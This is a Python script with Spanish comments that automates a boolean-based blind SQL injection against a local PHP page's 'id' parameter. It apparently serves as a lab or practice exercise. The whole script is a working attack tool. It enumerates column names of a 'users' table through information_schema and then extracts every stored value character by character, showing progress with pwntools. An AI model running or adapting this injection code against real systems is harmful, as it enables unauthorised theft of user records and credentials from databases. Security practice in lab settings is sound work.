#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
	print("\n [-] Saliendo...\n ")
	sys.exit(1)

#Ctrl+c
signal.signal(signal.SIGINT, def_handler)

URL = "http://127.0.0.1/get_sqli.php"
characters = string.ascii_letters + string.digits + string.punctuation # 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'

#Cuenta el numero de titulos que tiene la tabla users
def get_columns_count(id_correct, p1, p2):
	howmanyrows = 0
	#Se busca un maximo de 10 columnas (Que es el caso), para no atrasar la ejecucion
	for numrow in range(1,10):
		#Si la solicitud get con esta inyeccion  devuelve algo, quiere decir que existen mas columnas de las especificadas
		SQL_inj_add = "and (select count(column_name) FROM information_schema.columns WHERE table_name=\"users\")>%d" % (numrow)
		column_params = {
			'id': "%d %s" % (id_correct, SQL_inj_add)
		}
		p1.status(SQL_inj_add)
		#Realizo la solicitud GET
		req_colnum = requests.get(url = URL, params = column_params)
		#Si la web nos devuelve algo quiere decir que existen mas de las filas especificadas, por lo que hacemos + 1
		if(req_colnum.text != ''):
			howmanyrows = howmanyrows + 1
			p2.status("%s" % (howmanyrows))
		else:
			break # Para no tener que hacer iteraciones innecesarias
	#Actualizamos el numero de columnas existentes puesto que la query es (> Num)
	howmanyrows = howmanyrows + 1
	p2.status("%s" % (howmanyrows))
	#Retornamos el numero de filas
	return howmanyrows 

# Funcion que devolvera una lista de longitudes  que tienen los nombres de las columnas
def get_columns_length(id_correct, columns_count, p1, p2):
	lengths_list = []
	current_length = 0
	#Se busca sobre las columnas que existan
	for numrow in range(0,columns_count):
		#Iteramos con un maximo de 20 caracteres por cada titulo
		for c_length in range(1,20):
			#Si la solicitud get con esta inyeccion  devuelve algo, quiere decir que se da la condicion la longitud es correcta
			SQL_inj_add = "and (select length(column_name) FROM information_schema.columns WHERE table_name=\"users\" limit %d,1) >%d" % (numrow, c_length)
			column_params = {
				'id': "%d %s" % (id_correct, SQL_inj_add)
			}
			p1.status(SQL_inj_add)
			#Realizo la solicitud GET
			req_colnum = requests.get(url = URL, params = column_params)
			#Si la web nos devuelve algo quiere decir que existe una longiyud mayor que la especificada, por lo que hago + 1
			if(req_colnum.text != ''):
				current_length = current_length + 1
			else: # En el momento que de deja de dar la condicion, no se volvera a dar. Ej: Si la longitud no es >2, tampoco sera >3
				if(current_length > 0): #Nos aseguramos de no añadir en la lista longitudes de titulos inexistentes
					current_length = current_length + 1 # Actualizamos current_length antes de añadirlo a la lista
					p2.status("%s" % (current_length))
					lengths_list.append(current_length)
				break
		#Reiniciamos las variables puesto que pasaremos a por otro titulo
		current_length = 0
	#Retornamos el la lista de longitudes
	return lengths_list


# Funcion que devolvera una lista con los nombres de columnas que se han encontrado
def get_columns_names(id_correct, columns_count, lengths_list, p1, p2):
	tittles_list = []
	title_string = ''
	#Se busca sobre las columnas que existan
	for numrow in range(0,columns_count):
		current_len = lengths_list[numrow]
		#Iteramos hasta el maximo de caracteres de la columna
		for c_length in range(1,current_len+1):
			for c in characters:
				#Si la solicitud get con esta inyeccion  devuelve algo, significa que existe el caracter
				SQL_inj_add = "and (select substring(column_name,%d,1) FROM information_schema.columns WHERE table_name=\"users\" limit %d,1)=\"%s\"" % (c_length, numrow, c)
				column_params = {
					'id': "%d %s" % (id_correct, SQL_inj_add)
				}
				p1.status(SQL_inj_add)
				#Realizo la solicitud GET
				req_colnum = requests.get(url = URL, params = column_params)
				#Si la web nos devuelve algo quiere decir que existe ese caracter es esa posicion, por lo que añadimos el caracter a title_string
				if(req_colnum.text != ''):
					title_string = title_string + c
					p2.status(title_string)
					break # Ya hemos encontrado el caracter de esa posicion => Break
		#Al acabar de recorrer los caracteres, añadimos la palabra a nuestra lista y borramos el titulo actual
		tittles_list.append(title_string)
		title_string = ''

	print("Los titulos de la tabla users son: ----------")
	for x in range(len(tittles_list)):
		print("| [+] %s |" % (tittles_list[x]))
	print("----------------------------------------------")
 	#Retornamos el la lista de titulos
	return tittles_list

#Cuenta el numero de columnas referidas al contenido tiene la tabla users
def get_values_count(id_correct, tittles_list, p1, p2):
	howmanyrows = 0
	remove_list = ["user", "current_connections", "total_connections"] # Eliminamos de la lista los que no nos sirven
	for rm_str in remove_list:
		tittles_list.remove(rm_str)

	#Se busca un maximo de 10 columnas (Que es el caso), para no atrasar la ejecucion
	for numrow in range(1,10):
		#Si la solicitud get con esta inyeccion  devuelve algo, quiere decir la tabla users tiene mas filas de las especificadas
		SQL_inj_add = "and (select count(%s) FROM users)>%d" % (tittles_list[0], numrow)
		column_params = {
			'id': "%d %s" % (id_correct, SQL_inj_add)
		}
		p1.status(SQL_inj_add)
		#Realizo la solicitud GET
		req_colnum = requests.get(url = URL, params = column_params)
		#Si la web nos devuelve algo quiere decir que existen mas de las filas especificadas, por lo que hacemos + 1
		if(req_colnum.text != ''):
			howmanyrows = howmanyrows + 1
			p2.status("%s" % (howmanyrows))
		else:
			break # para no tener que hacer las 10 iteraciones innecesariamente => break
	#Actualizamos el numero de columnas existentes puesto que la query es (> Num)
	howmanyrows = howmanyrows + 1
	#Retornamos el numero de filas
	print("| La tabla users tiene: %d filas |" %(howmanyrows))
	print("----------------------------------------------")
	return howmanyrows 

# Funcion que devolvera un diccionario con las longitudes de cada fila y columna
def get_values_length(id_correct, values_count, tittles_list, p1, p2):
	lengths_values_dict = {}
	current_length = 0
	#Iteramos sobre los titulos de la tabla users
	for tittle in tittles_list:
		lengths_values_dict[tittle] = []
	#Se busca sobre las columnas que existan
		for numrow in range(0,values_count):
            #Iteramos con un maximo de 30 caracteres por cada valor
			for c_length in range(1,30):
			    #Si la solicitud get con esta inyeccion  devuelve algo, la longitud del valor de esa fila es mayor a la indicada
				SQL_inj_add = "and (select length(%s) FROM users LIMIT %d,1)>%d" % (tittle, numrow, c_length)
				column_params = {
					'id': "%d %s" % (id_correct, SQL_inj_add)
				}
				p1.status(SQL_inj_add)
			    #Realizo la solicitud GET
				req_colnum = requests.get(url = URL, params = column_params)
			    #Si la web nos devuelve algo quiere decir que existe una longiyud mayor que la especificada, por lo que hago + 1
				if(req_colnum.text != ''):
					current_length = current_length + 1
					p2.status("%s" % (current_length))
				else: # En el momento que de deja de dar la condicion, no se volvera a dar. Ej: Si la longitud no es >2, tampoco sera >3
					current_length = current_length + 1 # Actualizamos current_length antes de añadirlo al diccionario
					p2.status("%s" % (current_length))
					lengths_values_dict[tittle].append(current_length)
					break
			#Reiniciamos las variables puesto que pasaremos a por otro titulo
			current_length = 0
	print("La longitud de los valores de la tabla users son: ")
	for key,values in lengths_values_dict.items():
		print("| Titulo: %s |" % (key))
		for value in values:
			print("| Longitud: %s |" % (value))
		print("-------------------")
	print("=====================================================")
    #Retornamos el diccionario con las longitudes
	return lengths_values_dict


# Funcion que devolvera un diccionario con los valores de cada columna
def get_values_names(id_correct, values_count, len_values_dict, p1, p2):
	lengths_names_dict = {}
	current_title_index = 0
	name_str = ''
	pos_in_key = 0
	#Iteramos sobre los titulos
	for tittle,len_array in len_values_dict.items():
		lengths_names_dict[tittle] = []
		#Itero sobre el el numero de filas que tiene la tabla
		for num_row in range(0,len(len_array)):
            #Consigo la longitud que tiene la posicion num_row
			length = len_array[num_row]
		    #Itero sobre la longitud que tiene el string actual
			for len_x in range(1,length+1):
				#Iteramos sobre los caracteres para buscar el deseado
				for c in characters:
	    	       	#Comprobamos si la fila num_row de la tabla users en la posicion len_x de la volumna tittle es el caracter c
					if(tittle == "accountid"): #En el caso de accountid, no se trata de un string por lo que quitamos las comillas
						SQL_inj_add = "and (select substr(%s,%d,1) FROM users LIMIT %d,1)=%s" % (tittle, len_x, num_row, c)
					else:
						SQL_inj_add = "and (select substr(%s,%d,1) FROM users LIMIT %d,1)=\"%s\"" % (tittle, len_x, num_row, c)
					column_params = {
						'id': "%d %s" % (id_correct, SQL_inj_add)
					}
					p1.status(SQL_inj_add)
	    	    	#Realizo la solicitud GET
					req_colnum = requests.get(url = URL, params = column_params)
	    	    	#Si la web nos devuelve algo, existe ese caracter en la posicion dada => Añadimos el caracter a nuestra variable
					if(req_colnum.text != ''):
						name_str = name_str + c
						p2.status(name_str)
						break # Ya hemos encontrado el caracter para esta posicion, no buscamos mas caracteres
			#Añadimos el string a nuestro diccionario y la actualizamos a 0 puesto que la siguiente fila resultara en otra palabra
			lengths_names_dict[tittle].append(name_str)
			name_str = ''
	print("Los valores de la tabla users son: ")
	for key,values in lengths_names_dict.items():
		print("| Titulo: %s |" % (key) )
		for value in values:
			print("| Valor: %s |" % (value))
		print("-----------------------")
	print("=====================================================")
    #Retornamos el diccionario con las longitudes
	return lengths_names_dict

def blind_request():
	p1 = log.progress("Extraccion Blind SQLi: ")
	p1.status("Iniciando la extraccion")
	time.sleep(2)
	
	p2 = log.progress("Resultado SQLi: ")
	entered = False
	for i in range(1,10):
		id_param = {'id': i}
		r = requests.get(url = URL, params = id_param)
		if(r.text != '' and entered == False):  #Si existe noticia con ese id devolvera algun valor
			entered = True
			count_columns_users = get_columns_count(1, p1, p2)
			length_list = get_columns_length(i, count_columns_users, p1, p2)
			list_tittles = get_columns_names(i ,count_columns_users, length_list, p1, p2)			
			len_values_users = get_values_count(i, list_tittles, p1, p2)
			len_values_tittles_dict = get_values_length(i, len_values_users, list_tittles, p1, p2)
			get_values_names(i , len_values_users, len_values_tittles_dict, p1, p2)
		elif(entered == True): # Con encontrar un id nos sirve para hacer todas las pruebas
			sys.exit(0)
		else: #Si no existe el id devuelve un mensaje
			print("No existe el id=%d\n" % i)
			sys.exit(0)

if __name__ == '__main__':
	blind_request();
